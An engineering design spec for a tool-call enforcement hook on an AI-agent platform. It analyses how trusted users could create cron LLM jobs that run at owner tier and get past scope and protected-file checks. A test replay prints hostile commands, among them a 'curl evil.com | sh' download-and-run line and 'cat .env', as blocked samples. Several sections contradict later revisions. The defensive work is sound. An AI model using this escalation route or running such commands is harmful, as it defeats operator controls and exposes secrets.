# dinotrust — Non-Channel Lane Tier Inheritance (spec v0)

Status: **DESIGN ONLY (no code yet).** Grounded against the live box + repo as of 2026-10-28.
Every number below was measured, not inferred; the measurement command is named so it can be re-run.

## The gap (confirmed in code AND by execution)

`index.ts:1578` / `policy.ts` equivalent:

```ts
const agentSelf = sender == null && !isChannelLane(sessionKey);
const isOwner   = agentSelf || (sender != null && owners.includes(sender));
```

`CHANNEL_LANES` (index.ts:1433) holds only the 18 channel names (telegram, whatsapp, signal, ...).
Every other lane shape is "non-channel" → `sender == null` → `agentSelf` → **owner**.

Executed the real predicate (node, 2026-10-28):

```
agent:editor:telegram:group:-100123:topic:5   channelLane=true   -> agentSelf=false
agent:editor:subagent:helper                  channelLane=false  -> agentSelf=true -> isOwner=TRUE
agent:main:subagent:search-helper             channelLane=false  -> agentSelf=true -> isOwner=TRUE
agent:cs:main                                 channelLane=false  -> agentSelf=true -> isOwner=TRUE
```

The comment at index.ts:1427 states the intent plainly: *"A null id on a non-channel lane
(cron/explicit/main/subagent) is the agent operating itself unattended"*. That intent is correct for an
**owner-operated** agent. It is wrong the moment a **trusted** id can cause one of those lanes to exist.

**Consequence:** granting a trusted id the `cron` tool (or `sessions_spawn`) hands them a lane in which
they are owner — past `scopePathGlobs`, past `allowedTools`, past `protectedGlobs` (.env / openclaw.json /
AGENTS.md), past the critical gate.

## Measured ground truth (do NOT re-guess these)

### 1. Real lane shapes

From the live session store (`/root/.openclaw-analyst/agents/analyst/sessions/sessions.json`, 307 keys):

| count | shape | note |
|---|---|---|
| 264 | `agent:analyst:explicit:model-run-<uuid>` | **largest lane by far** |
| 25 | `agent:analyst:telegram:direct:<senderId>` | channel lane, id present |
| 12 | `agent:analyst:cron:<jobId>` | **job id is embedded in the key** |
| 6 | `agent:analyst:subagent:<uuid>` | opaque uuid, no parent reference |

Two findings that shape everything below:

- **The cron lane carries the job id.** At enforcement time the firing job is resolvable by
  `sessionKey.split(':cron:')[1]` — no new lane→job plumbing is required.
- **The subagent lane carries nothing.** Opaque uuid. `grep parentSessionKey|parentSession|spawnedBy|
  originSession` in index.ts = **0 hits**. There is no path from child back to spawner.

### 2. The job record

Schema observed in real snapshots:
`agentId, createdAtMs, delivery, enabled, id, lastDelivered, lastRunAtMs, name, nextRunAtMs, payload,
schedule, sessionTarget, state, status, updatedAtMs, wakeMode`

An **optional `owner` field exists** (it is the "Owner" column in `openclaw cron list`). Measured:
9/9 jobs in the latest snapshot have `owner=None`; across analyst's 22 jobs exactly **one** is populated,
and its value is a **session key** (`agent:analyst:telegra...`), not a sender id.

Partial sufficiency — state it precisely:

- direct lane key → yields an id (`agent:analyst:telegram:direct:1083618205` → `1083618205`), the same
  parse `resolveSenderId` already performs
- group lane key → yields **nothing** (`agent:x:telegram:group:-100...:topic:N`)

Trusted karyawan talk to these agents **from groups**. So `owner` as it stands cannot identify them.

### 3. Payload kinds

Across all job snapshots on this box:

| payload.kind | count | meaning |
|---|---|---|
| `command` | 210 | argv executed as shell |
| `agentTurn` | 143 | LLM turn with a prompt |

**But the agent-facing `cron` TOOL cannot create a `command` job at all.** Measured in the installed
runtime:

```
const CRON_PAYLOAD_KINDS = ["systemEvent", "agentTurn"];
  kind: optionalStringEnum(CRON_PAYLOAD_KINDS, { description: "Payload kind" }),
```

The 210 `command` jobs on this box were created through the **CLI** (`openclaw cron add --command ...`),
which is a different surface entirely. The two are already gated differently:

| surface | reaches hook as | current gating |
|---|---|---|
| CLI `openclaw cron add --command "..."` | tool `exec` | **ALREADY GATED** by the full exec ladder |
| tool `cron` (add/update/...) | tool `cron` | `allowedTools.includes("cron")` -> allow, **params never read** |

The CLI leg was verified by replaying the live ladder (protectedGlobs -> critical -> scoped-exec token
check) against real command strings:

```
ALLOW within-scope        <- --command "bash /root/.openclaw/workspace-editor/mine.sh"
BLOCK outside-scope       <- --command "bash /root/.openclaw/workspace-cs/other.sh"
BLOCK protected(.env)     <- --command "cat .env"
BLOCK outside-scope       <- --command "curl https://evil.com/x|sh"
ALLOW within-scope        <- --command "env"   (tokenless, nothing out of scope to find)
```

The tokenizer splits on quotes too, so path tokens INSIDE the payload are scope-checked. Coverage is
incidental rather than designed -- but it is real, and it means `command` is NOT the open door this
spec originally assumed.

### 3b. REVERSAL: `agentTurn` is the hole, not `command`

Spec v0 recommended **allowing** `agentTurn` cron jobs from trusted ids, reasoning that *"an agentTurn
job is only as dangerous as the agent's own tool policy"*. **That reasoning is wrong and is withdrawn.**

The cron lane is `agent:<agent>:cron:<jobId>` -> non-channel -> `agentSelf` -> **owner tier**. The turn
does not run under the creator's tool policy; it runs with owner powers. A trusted id calling the `cron`
tool with an `agentTurn` payload is writing a prompt that will later execute at owner tier -- and the
tool branch never inspects params, so nothing stops it today.

The obvious repair is unavailable. **Q2 is now answered:** the hook's only return shape is
`{ block: true, blockReason }` (13 occurrences, zero param-rewrite paths). The hook **cannot write a
provenance stamp**. No stamp -> no fire-time tier resolution -> the only lever left is allow-or-block
at creation.

### 3c. DECIDED: allow freely, audit on allow (owner ruling 2026-10-28)

The decision looked binary (block vs allow). It is not, and the framing was wrong:

> **A control that stops trusted staff from scheduling work is a failed design, not a safe one.**
> The trusted tier exists for *hired people doing their job*. Blocking `agentTurn` cron would cost
> 16 staff the ability to schedule any LLM task, permanently, to defend against a scenario that
> requires one of them to be adversarial.

The third path costs **zero** productivity and recovers most of the safety:

**ALLOW `agentTurn` cron creation from trusted ids, and AUDIT it on allow.**

- no friction: trusted staff schedule whatever they need, exactly as today
- full visibility: every trusted-authored owner-tier job is one grep away in the audit log
- precedent exists: `auditAllowedNonOwnerTools` already audits ALLOWED calls for precisely this reason
  ("an allowed tool returns before any audit() call, so a tool that is itself a security boundary
  leaves ZERO trace")
- nothing new is opened: those 16 ids can already do this today; the change is that it stops being
  invisible

What the residual actually is, stated plainly: a trusted id can schedule an LLM turn that later runs at
owner tier. Detection, not prevention. That is the correct trade for an **insider-trust** tier, where
the realistic threat is a mistake or a compromised account rather than a hostile employee -- and both of
those are caught by a log, while neither is prevented by friction that pushes people to work around it.

`systemEvent` and `command` need no separate treatment under this ruling.

### 3e. LINCHPIN CONFIRMED (2026-10-28) -- ledger-based tier inheritance IS buildable

Two earlier conclusions in this spec were WRONG and are corrected here.

**Correction 1 -- the hook CAN rewrite params.** Q2 was answered "no" from dinotrust's own 13
`return { block }` sites. That read our code, not the runtime contract. Measured in
`agent-tools.before-tool-call-*.js`:

```
adjustedParams = normalized?.params ?? decision.params
recordAdjustedParamsForToolCall(...)
executeParams = reconcileCodeModeExecBeforeHookParams({ adjustedParams: outcome.params })
```

**Correction 2 -- parent->child linkage EXISTS.** `grep parentSessionKey` in our `index.ts` returned 0
hits, but that searched the plugin, not the runtime's event surface. The runtime publishes 30+ hooks,
including:

```
subagent_spawned -> { runId, childSessionKey, agentId, requester{channel,accountId,to,threadId}, mode }
after_tool_call  -> { toolName, params, result, error, durationMs, toolCallId }
```

**Linchpin proven.** The gateway `cron.add` handler responds with the created job:

```
respond(true, "job" in result ? { created: result.created, ..., job: cronJobReadView(job) } ...)
```

So `after_tool_call` on a successful `cron add` carries the new jobId back to the hook.

**Mechanism (ledger, not stamp):**

| step | cron | subagent |
|---|---|---|
| capture | `before_tool_call(cron add)` on a channel lane -> sender id readable -> tier resolved | `before_tool_call(sessions_spawn)` -> tier resolved |
| bind | `after_tool_call` result -> jobId | `subagent_spawned` -> childSessionKey |
| persist | append `{jobId -> tier}` to a dinotrust-owned ledger on disk | `{childSessionKey -> tier}` |
| enforce | fire lane is `agent:<a>:cron:<jobId>` (§1) -> lookup -> apply tier | child lane -> lookup -> apply tier |

This supersedes §3c (audit-on-allow) and §3d: it is **prevention at zero creation-time friction**. Trusted
staff create cron/subagents exactly as freely as today; only the RESULT is bounded to what that person
could already do by hand.

It also answers "gate the prompt deterministically" (owner idea #2): you do not judge prompt text at all.
The child runs at the creator's tier, so every tool call it makes traverses the existing ladder. No
AGENTS.md SOP needed -- that would be advisory, this is enforced.

The earlier objection to an in-memory map (dies on restart -> silent fail-open) does not apply: dinotrust
already persists state to disk (`appendFileSync`/`readFileSync`, ~10 sites). And because the ledger is
OURS, written by the hook, the forgeable caller-supplied `job.owner` of §3d is irrelevant.

Grandfathering is unchanged: no ledger entry -> owner tier -> all 72 existing jobs run exactly as today.

### 3f. MEASURED FRICTION: relative paths break self-written tools

The owner asked whether a trusted id can exec a tool they wrote themselves that is in no allowlist.
**Yes -- but only with absolute paths.** Replaying the scoped-exec token check against scope
`**/workspace-editor/**`:

```
ALLOW   python3 /root/.openclaw/workspace-editor/tools/mine.py
ALLOW   bash /root/.openclaw/workspace-editor/scripts/deploy.sh
ALLOW   node /root/.openclaw/workspace-editor/x.js
BLOCK   python3 tools/mine.py                      out=tools/mine.py
BLOCK   bash scripts/deploy.sh                     out=scripts/deploy.sh
BLOCK   ./venv/bin/python tools/mine.py            out=./venv/bin/python, tools/mine.py
BLOCK   cd <ws> && python3 tools/mine.py           out=<ws>, tools/mine.py  (also trips SHELL_META on &&)
BLOCK   python3 <abs>/mine.py --out /tmp/x.json    out=/tmp/x.json
```

The token filter is `t.includes("/")`, so a RELATIVE path is a path-ish token that cannot match an
absolute-rooted glob. Three everyday forms die: relative invocation, the venv interpreter prefix, and
writing output to `/tmp`. Workspace-local conventions documented elsewhere in this fleet ("no `cd`
needed, exec cwd IS the workspace") produce exactly the blocked form.

This is real productivity friction and is independent of everything else in this spec. Candidate fixes:
resolve relative tokens against the session cwd before matching; allow a scratch glob (`/tmp/**`) for
outputs; treat a known interpreter prefix as non-path. Not yet designed -- recorded so it is not lost.

### 3g. Why CALLER-SUPPLIED provenance is dead (superseded by §3e)

One more measurement closes the door the other way. The job `owner` field is **caller-supplied**:

```
const ownerSessionKey = normalizeOptionalString(input.owner?.sessionKey);
...ownerAgentId || ownerSessionKey ? { owner: { ...ownerSessionKey ? { sessionKey: ownerSessionKey } : {} } }
```

It is read from `input.owner`, never stamped by the runtime from the calling session. So it is
attacker-controlled and cannot serve as provenance even if the hook could write it (it cannot -- Q2).

Combined with §2 (a group-lane sessionKey carries no sender id anyway), provenance-based tier
inheritance is **not buildable on this runtime**. Audit-on-allow is not a compromise chosen over a
better mechanism; it is the best mechanism that exists here.

### 4. Exposure on this box

- tool `cron` already granted to trusted ids: editor 8, modul 4, marketing 2, MAIN/webdev 2 = **16 ids**
- tool `sessions_spawn`: **0** across all 14 gateways
- dinotrust gates `cron` nowhere: `grep '"cron"'` in gate logic = 0 hits
- job census (14 gateways, `openclaw cron list`): **72 jobs total** —
  analyst 22 · sosmed 14 · ads 7 · kttal 7 · cs 4 · event 3 · konsultan 3 · modul 3 · sales 3 ·
  editor 2 · kaka689 2 · marketing 2 · MAIN 0 · extractor 0
- gateways holding BOTH jobs AND cron-granted trusted ids: editor (2), modul (3), marketing (2)
  → only **7 jobs** ever need provenance review
- `/root/.dinotrust/logs/enforce.log`: 8 lines, from July, 0 `subagent` hits
  → **no production evidence of exploitation; this is a code reading plus an executed predicate**

## The reshaping insight: gate CREATION, don't inherit at FIRE

The obvious design is "stamp the job with its creator, resolve that tier when it fires". Measurement 2
shows that road is blocked for exactly the population we care about (group-lane creators).

But a creation-time gate **does not need the stamp at all**:

> At creation the trusted user is on a **channel lane**, so their identity is fully readable and their
> tier fully resolvable. The payload is **static, inspectable data**. Reject at `add`/`update` any job
> whose payload exceeds what that user could have executed directly. A job that survives the gate is,
> by construction, a job its creator was already entitled to run.

The job may then fire in an owner-tier lane without harm, because the capability was bounded when it was
written. **No persistence, no schema change, no migration, no new plumbing.**

Provenance stamping remains desirable for **audit** ("who created job X") — but it is NOT load-bearing
for enforcement, and must not be allowed to block shipping the gate.

### Scope of the creation gate

Revised after §3/§3b. The gate lives on the **`cron` tool branch** of `decideTrusted`, which today
allows the whole tool without reading params:

Revised again after the §3c ruling. There is **no blocking gate**. The work is audit instrumentation:

- `cron` + mutating action (`add`/`update`/`remove`/`run`) by a trusted id -> **allow**, and emit one
  audit line naming the id, the action, and `payload.kind`
- `cron` + read action (`list`/`get`/`runs`/`status`) -> allow silently; mirror the
  `PROCESS_READ_ACTIONS` set already in `policy.ts` rather than inventing a second shape
  (DRY: reuse before reinvent)
- `payload.kind=command` -> unreachable from this tool; the CLI route already traverses the exec ladder.
  Do NOT write a second control for it -- a duplicate drifts out of sync with the one actually enforcing.
- owner and non-owner paths are untouched

This is strictly additive: no call that succeeds today starts failing.

IMPLEMENTATION NOTE: `ToolCall` already carries an optional `action` field (added for `process`), so the
sub-action is available without a schema change -- but the **adapter must populate it for `cron` too**,
and `payload` is not on `ToolCall` at all. Adding a narrow accessor is part of step 5.
- `delivery` targets are an exfil surface (announce → arbitrary chat/webhook). Gate `delivery.to`
  against the same rules as a message send for that tier.

## Subagent: the hard half — do NOT pretend it is solved

The creation gate does not transfer. The child is an autonomous LLM: the brief can read harmless and the
execution not be. And measurement 1 shows there is no parent→child linkage to inherit through.

Candidate mechanisms, with honest costs:

| option | mechanism | cost / failure mode |
|---|---|---|
| A | in-memory map at spawn: hook sees `sessions_spawn` from a trusted sender, records `childKey → tier` | hook may not observe the generated child key; map dies on gateway restart → silent fail-OPEN |
| B | keep `sessions_spawn` denied for trusted (**status quo**) | zero new risk, zero new capability; the ask stays unmet |
| C | treat any `subagent` lane as non-owner unless a positive owner stamp exists | fail-CLOSED and sound, but breaks owner-initiated subagents unless the stamp lands first |

**Recommendation: ship cron first, keep B for subagent**, and only revisit once an owner-stamp mechanism
exists that C can stand on. Shipping A without solving the restart case would create a security control
that silently stops existing — worse than the honest denial of B.

## The `explicit` lane: measured, OUT OF SCOPE (reason recorded)

`explicit:model-run-<uuid>` is the largest non-channel lane everywhere it appears (analyst 264/307;
cs 390, event 324, marketing 216, modul 135). It inherits owner by the same predicate, so it was
flagged as a potential "we lock the small door while the big one stands open" failure.

**Measured 2026-10-28 — it is not an enforcement surface at all.**

Read every reachable session file for this lane across 5 gateways:

```
explicit lanes total (5 gw) : 1329
session files read          : 794   (535 missing — archived/pruned)
event types                 : session 794, model_change 794,
                              thinking_level_change 794, message 1589, custom 1
TOOL CALLS                  : 0   (zero, in all 794)
```

**Zero tool calls in 794 sessions.** dinotrust enforces at the tool-call boundary, so a lane that never
issues one never reaches the hook. Its owner-tier status is inert: there is nothing to gate.

Corroborating evidence for what creates them (consistent, though not proven from source):

- `scripts/fix-kaka689-model-resolution-mitigations.sh` names the cause directly: a non-empty
  `WARM_MAIN_AGENTS` *"caused `agent:kaka689:explicit:model-run-*` warm"* — a background model-catalog
  warm, not a user action
- model distribution is 255/264 `ag/gemini-3.8-flash-medium` across only 3 distinct models — a cheap
  probe model, not an agent doing work
- creation arrives in bursts (four separate bursts of exactly 14 sessions inside 60s) — machine-
  scheduled, not human-paced
- the lane content is `session` + `model_change` + `thinking_level_change` + 2 messages, then ends

NOT fully proven: `grep -r "model-run"` across the installed openclaw package returns **0 hits**, so the
key is assembled from parts at runtime and the constructing code was not located. The out-of-scope call
rests on the **zero-tool-call measurement**, which is sufficient on its own — even if a trusted id could
somehow induce one, an inert lane grants nothing.

**Decision: out of scope.** Revisit only if a `model-run` session is ever observed issuing a tool call.

## Back-compat contract (the ship blocker)

Two **independent** layers, both verified in source:

1. `policy.ts:226` → `trustedIds: []` by default, commented *"empty by default; zero behavior change
   unless an install explicitly grants trust"*. And `index.ts:1581`:
   `const trusted = (!isOwner && sender != null && c.trustedIds.length > 0) ? findTrusted(...) : null;`
   An install with no trusted ids never enters this branch — **the new code cannot run there at all.**
2. The creation gate only fires on `cron` `add`/`update` **by a trusted sender**. Existing jobs are never
   re-evaluated, never rewritten, never migrated. 72 jobs on this box: 0 touched.

To be affected at all, an install must (a) deliberately populate `trustedIds`, (b) grant them tool
`cron`, and (c) have one of them create or edit a job **after** the update.

`normalizeConfig()` already handles older configs (`{...DEFAULT_POLICY, ...raw}` + per-key array
fallback), so a config lacking any new field takes the default rather than throwing.

Follow existing dinotrust precedent — **config flag, default = current behaviour**
(cf. `auditAllowedNonOwnerTools: false`, `ownerSelfApproval: "warn"`, `allowScopedCritical` default OFF).

**Stated openly, not back-compat:** a trusted user who could previously register any job becomes
tier-bounded at creation. Existing jobs keep running; only creation changes. That is the fix, not a
side effect.

## Mandatory selftest cases

| # | case | expected |
|---|---|---|
| 1 | config with **no** trustedIds | verdict byte-identical to pre-patch (the back-compat ship blocker) |
| 2 | owner creates `command` job with critical argv | unchanged from today |
| 3 | trusted creates `command` job with argv **inside** their scope | allow |
| 4 | trusted creates `command` job with argv **outside** their scope | block, reason names the resolved target |
| 5 | trusted creates benign job, then `update`s payload to out-of-scope argv | block (the update bypass) |
| 6 | trusted creates `agentTurn` job | allow per recommendation (a); asserted explicitly so a later change is deliberate |
| 7 | unattended cron fires an existing job (no stamp) | still owner; **still runs** |
| 8 | trusted sets `delivery.to` to an unauthorized target | block |
| 9 | non-owner (not trusted) calls cron | block, as today |

Case 1 and case 7 are the two that make the "other installs are unaffected" claim **evidence** instead of
assertion. Neither may be skipped.

## Two-file sync hazard

`enforce/core/policy.ts` and `enforce/adapters/openclaw/handler.ts` carry mirrored logic, and
`/root/.openclaw/extensions/dinotrust-enforce/index.ts` is the copy that actually runs on this box.
v1.27.0's own notes record this drift trap. Any change here lands in **all three**, and both selftests
(`policy.selftest.mjs`, `adapters/openclaw/selftest.mjs`) must be green before tagging.

## Open questions (blocking implementation)

1. ~~What creates `explicit:model-run-*`~~ — **RESOLVED 2026-10-28**: inert lane, 0 tool calls in 794
   sessions, out of scope. See the section above.
2. ~~Can the enforce hook modify tool-call params?~~ -- **RESOLVED 2026-10-28**: NO. The only return
   shape is `{ block: true, blockReason }` (13 occurrences, zero param-rewrite paths). A provenance
   stamp cannot be written from the hook, which is what forces the creation-gate design in §3b.
3. Of the 7 jobs on editor/modul/marketing, were any created by a trusted id? (~10 min audit; affects
   nothing in the design, only what we tell the owner about existing state)

Neither remaining question blocks implementation: Q2 concerns an audit-only nicety, Q3 concerns reporting
on existing state. **Step 5 (implement the cron creation gate) is unblocked.**
